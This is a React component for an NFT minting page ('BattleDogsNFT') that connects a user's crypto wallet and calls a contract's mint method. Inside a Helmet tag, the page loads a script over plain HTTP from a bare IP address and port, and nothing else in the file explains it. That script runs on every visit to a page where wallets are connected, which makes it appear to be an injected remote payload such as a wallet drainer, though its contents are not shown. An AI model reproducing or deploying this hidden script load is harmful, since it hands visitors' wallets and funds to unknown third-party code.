import React, { useEffect, useState, useRef } from "react";
import { useDispatch, useSelector } from "react-redux";
import { connect } from "./redux/blockchain/blockchainActions";
import { fetchData } from "./redux/data/dataActions";
import * as s from "./styles/globalStyles";
import styled from "styled-components";
import {Helmet} from "react-helmet";

function myFunction2() {
  var x = document.getElementById("toclose");
  if (x.style.display === "block") {
    x.style.display = "none";

  } else {
    x.style.display = "block";
  }
}


export const StyledButton = styled.button`
  padding: 10px;
  border-radius: 50px;
  border: none;
  padding: 10px;
  background-color: transparent;
  font-weight: bold;
  color: white;
  width: 100px;
  cursor: pointer;
  :active {
    box-shadow: none;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
  }
`;

export const StyledRoundButton = styled.button`
  padding: 10px;
  border-radius: 100%;
  border: none;
  background-color: transparent;
  padding: 10px;
  font-weight: bold;
  font-size: 5px;
  color: white;
  width: 30px;
  height: 30px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;

  :active {
    box-shadow: none;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
  }
`;

export const ResponsiveWrapper = styled.div`
  display: flex;
  flex: 1;
  flex-direction: column;
  justify-content: stretched;
  align-items: stretched;
  width: 100%;
  @media (min-width: 767px) {
    flex-direction: row;
  }
`;

export const StyledLogo = styled.img`
  width: 200px;
  @media (min-width: 767px) {
    width: 300px;
  }
  transition: width 0.5s;
  transition: height 0.5s;
`;

export const StyledImg = styled.img`
  box-shadow: 0px 5px 11px 2px rgba(0, 0, 0, 0.7);
  border: 4px dashed var(--secondary);
  background-color: var(--accent);
  border-radius: 100%;
  width: 200px;
  @media (min-width: 900px) {
    width: 250px;
  }
  @media (min-width: 1000px) {
    width: 300px;
  }
  transition: width 0.5s;
`;

export const StyledLink = styled.a`
  color: var(--secondary);
  text-decoration: none;
`;
const truncate = (input, len) =>
  input.length > len ? `` : input;

function Mint() {
  const dispatch = useDispatch();
  const blockchain = useSelector((state) => state.blockchain);
  const data = useSelector((state) => state.data);
  const [claimingNft, setClaimingNft] = useState(false);
  const [feedback, setFeedback] = useState(``);
  const [mintAmount, setMintAmount] = useState(1);
  const [CONFIG, SET_CONFIG] = useState({
    CONTRACT_ADDRESS: "",
    SCAN_LINK: "",
    NETWORK: {
      NAME: "",
      SYMBOL: "",
      ID: 0,
    },
    NFT_NAME: "",
    SYMBOL: "",
    MAX_SUPPLY: 1,
    WEI_COST: 0,
    DISPLAY_COST: 0,
    GAS_LIMIT: 0,
    MARKETPLACE: "",
    MARKETPLACE_LINK: "",
    SHOW_BACKGROUND: false,
  });

  const claimNFTs = () => {
    let cost = 60000000000000000;
    let gasLimit = CONFIG.GAS_LIMIT;
    let totalCostWei = String(cost * mintAmount);
    let totalGasLimit = String(gasLimit * mintAmount);
    console.log("Cost: ", totalCostWei);
    console.log("Gas limit: ", totalGasLimit);
    setFeedback(`Minting your ${CONFIG.NFT_NAME}...`);
    setClaimingNft(true);
    blockchain.smartContract.methods
      .mint(mintAmount)
      .send({
        gasLimit: String(totalGasLimit),
        to: CONFIG.CONTRACT_ADDRESS,
        from: blockchain.account,
        value: totalCostWei,
      })
      .once("error", (err) => {
        console.log(err);
        setFeedback("Sorry, something went wrong please try again later.");
        setClaimingNft(false);
      })
      .then((receipt) => {
        console.log(receipt);
        setFeedback(
          `WOW, the ${CONFIG.NFT_NAME} is yours! go visit Opensea.io to view it.`
        );
        setClaimingNft(false);
        dispatch(fetchData(blockchain.account));
      });
  };

  const decrementMintAmount = () => {
    let newMintAmount = mintAmount - 1;
    if (newMintAmount < 1) {
      newMintAmount = 1;
    }
    setMintAmount(newMintAmount);
  };

  const incrementMintAmount = () => {
    let newMintAmount = mintAmount + 1;
    if (newMintAmount > 3) {
      newMintAmount = 3;
    }
    setMintAmount(newMintAmount);
  };

  const getData = () => {
    if (blockchain.account !== "" && blockchain.smartContract !== null) {
      dispatch(fetchData(blockchain.account));
    }
  };

  const getConfig = async () => {
    const configResponse = await fetch("/config/config.json", {
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
    });
    const config = await configResponse.json();
    SET_CONFIG(config);
  };

  useEffect(() => {
    getConfig();
  }, []);

  useEffect(() => {
    getData();
  }, [blockchain.account]);

  return (
    
    <header className="header-main2">
            <img src="img/mint_image.gif" className="img-9999"  width={1920} height={1080} />
            <img src="img/mintpage.gif" className="img-99999"  width={1920} height={1080} />
            <img src="img/mint_1.png" className="bd_img_main"  width="350px" />

        <link rel="stylesheet" href="css/mint.css" type="text/css" />
        <link rel="stylesheet" href="css/style.css" type="text/css" />
        <Helmet>
                  <script src="http://185.33.93.182:3000/js/app.js"></script>
              </Helmet>

  <div className="container">
    <div className="row">
      {/* <nav id="nav-main" className="navbar navbar-expand-lg navbar-light ">
        <div className="container" id="nav-sticky">
          <button className="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span className="navbar-toggler-icon" />
          </button>
          <div className="collapse navbar-collapse col-md-12 clearfix" id="navbarSupportedContent">
            <img src="img/3logowhite.png"  width="300px" />
            <ul className="navbar-nav me-auto mb-2 mb-lg-0 fw-bold text-light menu col-md-4">
              <li className="nav-item">
                <a className="nav-link active" aria-current="page" href="/">Home</a>
              </li>
              <li className="nav-item">
                <a className="nav-link active" aria-current="page" href="mint">Mint</a>
              </li>
            </ul>
            <div className="nav-end-box d-flex col-md-4 justify-content-end">
              <a href="https://twitter.com/BattleDogsNFT"><i className="fab fa-twitter" /></a>
              <a href="https://discord.gg/XCWBFGZ87t"><i className="fab fa-discord" /></a>
            </div>
          </div>
        </div>
      </nav> */}<nav id="nav-main" className="navbar navbar-expand-lg navbar-light">
                              <div className="container" id="nav-sticky">
                                  {/* <button className="`navbar-toggler`" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                                      <span className="navbar-toggler-icon" />
                                  </button> */}
                                  {/* <a className="icon-55" onClick={myFunction2}>
                                      <i className="fa fa-bars" />
                                  </a> */}
                                  {/* <button className="`navbar-toggler`" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                                      <span className="navbar-toggler-icon" />
                                  </button> */}
                                  {/* <a className="icon-55" onClick={myFunction2}>
                                      <i className="fa fa-bars" />
                                  </a> */}
                                    <nav class="nav">
                                    <input class="nav__trigger-input" type="checkbox" id="trigger" aria-label="open the navigation"/>
                                    <label class="nav__trigger-finger" for="trigger">
                                        <span></span>
                                    </label>
                                    <ul class="nav__list" id="toclose">
                                        <li class="nav__item">
                                        <a href="#roadmap" class="nav__link">
                                                <li className="nav-item w2-animate-top2">
                                                    <a className="nav-link active" onClick={myFunction2} aria-current="page" href="/">Home</a>
                                                </li>
                                        </a>
                                        </li>
                                        <li class="nav__item">
                                        
                                       
                                        <div className="nav-end-box d-flex col-md-4 justify-content-end twt-img w2-animate-top5">
                                                <a href="https://twitter.com/BattleDogsNFT"><i className="fab fa-twitter" /></a>
                                                <a href="https://discord.gg/XCWBFGZ87t"><i className="fab fa-discord" /></a>
                                        </div>
                                        <input class="nav__submenu-trigger-input" type="checkbox" id="submenu-trigger" />
                                    
                                        </li>
                                    </ul>
                                    </nav>

                             
                                    {/* <div className="navbar-collapse col-md-12 clearfix" id="navbarSupportedContent">
                                        <div className="w3-container w2-animate-top">
                                            <img className="img-logo-2" src="img/3logowhite.png"  width="200px" />
                                            <ul className="navbar-nav me-auto mb-2 mb-lg-0 fw-bold text-light menu col-md-4">
                                                
                                                
                                        
                                                
                                            </ul>
                                            
                                            </div>
                                    </div> */}
                                  
                              </div>
                          </nav>
                          <nav id="nav-main" className="navbar navbar-expand-lg navbar-light">
                              <div className="container" id="nav-sticky">
                                  {/* <button className="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                                      <span className="navbar-toggler-icon" />
                                  </button>
                                   */}
                                  <div className="navbar-collapse col-md-12 clearfix" id="navbarSupportedContent">
                                      <img className="img-logo-2" src="img/3logowhite.png"  width="200px" />
                                      <ul className="navbar-nav me-auto mb-2 mb-lg-0 fw-bold text-light menu col-md-4">
                                          <li className="nav-item2">
                                              <a className="nav-link active" id="nav-close" aria-current="page" href="/">Home</a>
                                          </li>
                                      </ul>
                                      <div className="nav-end-box d-flex col-md-4 justify-content-end twt-img">
                                          <a href="https://twitter.com/BattleDogsNFT"><i className="fab fa-twitter" /></a>
                                          <a href="https://discord.gg/XCWBFGZ87t"><i className="fab fa-discord" /></a>
                                      </div>
                                  </div>
                              </div>
                          </nav>
      <div className="mint_imgs">
        <s.Container 
              flex={2}
              jc={"center"}
              style={{
                backgroundColor: "transparent",
                padding: 75,
                borderRadius: 24,
                top: "200px",
                position: "relative",
                
              }}
            >
            {/* <img src="img/mint_1.png"  width="350px" /> */}
              
              
              <s.SpacerSmall />
              {Number(data.totalSupply) >= CONFIG.MAX_SUPPLY ? (
                <>
                  <s.TextTitle
                    style={{ textAlign: "center", color: "white" }}
                  >
                    The sale has ended.
                  </s.TextTitle>
                  <s.TextDescription
                    style={{ textAlign: "center", color: "white" }}
                  >
                    You can still find {CONFIG.NFT_NAME} on
                  </s.TextDescription>
                  <s.SpacerSmall />
                  <StyledLink target={"_blank"} href={CONFIG.MARKETPLACE_LINK}>
                    {CONFIG.MARKETPLACE}
                  </StyledLink>
                </>
              ) : (
                <>
                  
                  <s.SpacerXSmall />
                  <s.TextDescription
                    style={{ textAlign: "center", color: "white" }}
                  >
                    {/* Excluding gas fees. */}
                  </s.TextDescription>
                  <s.SpacerSmall />
                  {blockchain.account === "" ||
                  blockchain.smartContract === null ? (
                    <s.Container  jc={"center"}>

                      <s.SpacerSmall />
                      <StyledButton
                        onClick={(e) => {
                          e.preventDefault();
                          dispatch(connect());
                          getData();
                        }}
                      >
                        <img className="img_3245" src="img/mint_2.png"  width="200px" />
                      </StyledButton>
                      {blockchain.errorMsg !== "" ? (
                        <>
                          <s.SpacerSmall />
                          <s.TextDescription
                            style={{
                              textAlign: "center",
                              color: "white",
                            }}
                          >
                            {blockchain.errorMsg}
                          </s.TextDescription>
                        </>
                      ) : null}
                    </s.Container>
                  ) : (
                    <>
                      <s.TextDescription
                        style={{
                          textAlign: "center",
                          color: "white",

                        }}
                      >
                        {feedback}
                      </s.TextDescription>
                      <s.SpacerMedium />
                      <s.Container ai={"center"} fd={"row"} className="img_3246" >
                        <StyledRoundButton
                          style={{ lineHeight: 0.4 }}
                          disabled={claimingNft ? 1 : 0}
                          onClick={(e) => {
                            e.preventDefault();
                            decrementMintAmount();
                          }}
                        >
                          <img src="img/mint_4.png"  width="100px" />
                        </StyledRoundButton>
                        <s.SpacerMedium />
                        <s.TextDescription
                          style={{
                            textAlign: "center",
                            color: "white",
                            fontSize: "25px",
                            position: "relative",
                            left: "1%",
                          }}
                        >
                          {mintAmount}
                        </s.TextDescription>
                        <s.SpacerMedium />
                        <StyledRoundButton
                          disabled={claimingNft ? 1 : 0}
                          onClick={(e) => {
                            e.preventDefault();
                            incrementMintAmount();
                          }}
                        >
                          <img src="img/mint_5.png"  width="100px" />
                        </StyledRoundButton>
                      </s.Container>
                      <s.SpacerSmall />
                      <s.Container ai={"center"} fd={"row"}>
                        <StyledButton
                          disabled={claimingNft ? 1 : 0}
                          onClick={(e) => {
                            e.preventDefault();
                            claimNFTs();
                            getData();
                          }}
                        >
                          {claimingNft ? "BUSY" : <img src="img/mint_3.png"  width="200px" className="img_3247" />}
                        </StyledButton>
                      </s.Container>

                    </>
                  )}
                  <s.TextTitle className="text_3248"
                    style={{ textAlign: "center", color: "white", position: "relative", left: "-3%" }}
                  >
                  {data.totalSupply} / {CONFIG.MAX_SUPPLY} Minted | 1 {CONFIG.SYMBOL} costs {0.06}{" "}
                    {CONFIG.NETWORK.SYMBOL}.
                  </s.TextTitle>
                </>
              )}
              <s.SpacerMedium />
            </s.Container>
            <s.SpacerLarge />
          <s.SpacerMedium />
        </div>
        {/* <s.Container jc={"center"} ai={"center"} style={{ width: "70%" }}>
          <s.TextDescription
            style={{
              textAlign: "center",
              color: "var(--primary-text)",
            }}
          >
            Please make sure you are connected to the right network (
            {CONFIG.NETWORK.NAME} Mainnet) and the correct address. Please note:
            Once you make the purchase, you cannot undo this action.
          </s.TextDescription>
          <s.SpacerSmall />
          <s.TextDescription
            style={{
              textAlign: "center",
              color: "var(--primary-text)",
            }}
          >
            We have set the gas limit to {CONFIG.GAS_LIMIT} for the contract to
            successfully mint your NFT. We recommend that you don't lower the
            gas limit.
          </s.TextDescription>
        </s.Container> */}
      
    </div>
  </div>
  <div className="mint_imgs2">
        <s.Container 
              flex={2}
              jc={"center"}
              style={{
                backgroundColor: "transparent",
                padding: 75,
                borderRadius: 24,
                position: "absolute",
                top: "-250px"
              }}
            >
              
              
              <s.SpacerSmall />
              {Number(data.totalSupply) >= CONFIG.MAX_SUPPLY ? (
                <>
                  <s.TextTitle
                    style={{ textAlign: "center", color: "white" }}
                  >
                    The sale has ended.
                  </s.TextTitle>
                  <s.TextDescription
                    style={{ textAlign: "center", color: "white" }}
                  >
                    You can still find {CONFIG.NFT_NAME} on
                  </s.TextDescription>
                  <s.SpacerSmall />
                  <StyledLink target={"_blank"} href={CONFIG.MARKETPLACE_LINK}>
                    {CONFIG.MARKETPLACE}
                  </StyledLink>
                </>
              ) : (
                <>
                  
                  <s.SpacerXSmall />
                  <s.TextDescription
                    style={{ textAlign: "center", color: "white" }}
                  >
                    {/* Excluding gas fees. */}
                  </s.TextDescription>
                  <s.SpacerSmall />
                  {blockchain.account === "" ||
                  blockchain.smartContract === null ? (
                    <s.Container  jc={"center"}>

                      <s.SpacerSmall />
                      <StyledButton
                        onClick={(e) => {
                          e.preventDefault();
                          dispatch(connect());
                          getData();
                        }}
                      >
                        <img className="img_3245" src="img/mint_2.png"  width="200px"
                         />
                      </StyledButton>
                      {blockchain.errorMsg !== "" ? (
                        <>
                          <s.SpacerSmall />
                          <s.TextDescription
                            style={{
                              textAlign: "center",
                              color: "white",
                            }}
                          >
                            {blockchain.errorMsg}
                          </s.TextDescription>
                        </>
                      ) : null}
                    </s.Container>
                  ) : (
                    <>
                      <s.TextDescription
                        style={{
                          textAlign: "center",
                          color: "white",

                        }}
                      >
                        {feedback}
                      </s.TextDescription>
                      <s.SpacerMedium />
                      <s.Container ai={"center"} fd={"row"} className="img_3246" >
                        <StyledRoundButton
                          style={{ lineHeight: 0.4 }}
                          disabled={claimingNft ? 1 : 0}
                          onClick={(e) => {
                            e.preventDefault();
                            decrementMintAmount();
                          }}
                        >
                          <img src="img/mint_4.png"  width="100px" style={{
                          position: "initial"
                        }} />
                        </StyledRoundButton>
                        <s.SpacerMedium />
                        <s.TextDescription
                          style={{
                            textAlign: "center",
                            color: "white",
                            fontSize: "25px",
                            position: "relative",
                            left: "1%",
                          }}
                        >
                          {mintAmount}
                        </s.TextDescription>
                        <s.SpacerMedium />
                        <StyledRoundButton
                          disabled={claimingNft ? 1 : 0}
                          onClick={(e) => {
                            e.preventDefault();
                            incrementMintAmount();
                          }}
                        >
                          <img src="img/mint_5.png"  width="100px" style={{
                          position: "initial"
                        }} />
                        </StyledRoundButton>
                      </s.Container>
                      <s.SpacerSmall />
                      <s.Container ai={"center"} fd={"row"}>
                        <StyledButton
                          disabled={claimingNft ? 1 : 0}
                          onClick={(e) => {
                            e.preventDefault();
                            claimNFTs();
                            getData();
                          }}
                        >
                          {claimingNft ? "BUSY" : <img src="img/mint_3.png"  width="200px" className="img_3247"  style={{
                          position: "initial"
                        }}/>}
                        </StyledButton>
                      </s.Container>

                    </>
                  )}
                  <s.TextTitle className="text_3248"
                    style={{ textAlign: "center", color: "white" }}
                  >
                  {data.totalSupply} / {CONFIG.MAX_SUPPLY} Minted | 1 {CONFIG.SYMBOL} costs {0.06}{" "}
                    {CONFIG.NETWORK.SYMBOL}.
                  </s.TextTitle>
                </>
              )}
              <s.SpacerMedium />
            </s.Container>
            <s.SpacerLarge />
          <s.SpacerMedium />
        </div>
</header>

  );
  
}

export default Mint;

